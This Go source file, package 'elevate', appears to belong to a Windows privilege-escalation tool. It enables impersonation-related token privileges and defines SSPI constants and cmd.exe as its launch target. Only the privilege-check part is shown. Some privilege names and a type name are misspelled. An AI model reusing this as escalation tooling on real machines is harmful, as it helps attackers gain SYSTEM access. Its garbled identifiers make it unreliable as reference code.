package elevate


import(
	"golang.org/x/sys/windows"
	"fmt"
	"strconv"
)

const (
	SE_IMPERSONATE          = "SeImpersonatePrivilege"
	SE_ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryToken"
	SE_INCREASE_QUOTE_NAME  = "SeIncreaseQuoteName"
	SECPKG_CRED_INBOUND     = 0x00000001
	SECBUFFER_VERSION       = 0x00000000
	SECBUFFER_TOKEN         = 0x00000002
	CREATE_NEW_CONSOLE      = 0x00000010
	ASC_REQ_ALLOCATE_MEMORY = 0x00000100
	ASC_REQ_CONNECTION      = 0x00000800
	SECURITY_NATIVE_DREP    = 0x00000010
	SecurityImpersonation   = 0x00000002
	program                 = "C:\\Windows\\System32\\cmd.exe"
	args                    = ""
)




func CheckPriv() (bool){
	fmt.Println("[+] Checking privileges")

	canImpersonate := EnablePrivilege(SE_IMPERSONATE)
	canAssignPrimaryToken := EnablePrivilege(SE_ASSIGN_PRIMARY_TOKEN)
	canIncreaseQuoteName := EnablePrivilege(SE_INCREASE_QUOTE_NAME)

	fmt.Println("[+] SeImpersonate " + strconv.FormatBool(canImpersonate))
	fmt.Println("[+] SeAssignPrimaryToken " + strconv.FormatBool(canAssignPrimaryToken))
	fmt.Println("[+] SeIncreaseQuoteName " + strconv.FormatBool(canIncreaseQuoteName))

	if !canImpersonate && !canAssignPrimaryToken {
		fmt.Println("[!] Missing necessary privileges")
		return false
	}
	fmt.Println("[+] Privileges ok")
	return true
}



func EnablePrivilege(securityEntity string) bool {
	var luid windows.LUID
	var token windows.Token
	err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(securityEntity), &luid)

	if err != nil {
		return false
	}

	handle := windows.CurrentProcess()
	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)

	if err != nil {
		return false
	}

	tokenPrivs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &tokenPrivs, 1024, nil, nil)
	if err != nil || windows.GetLastError() != nil {
		return false
	}

	return true
}
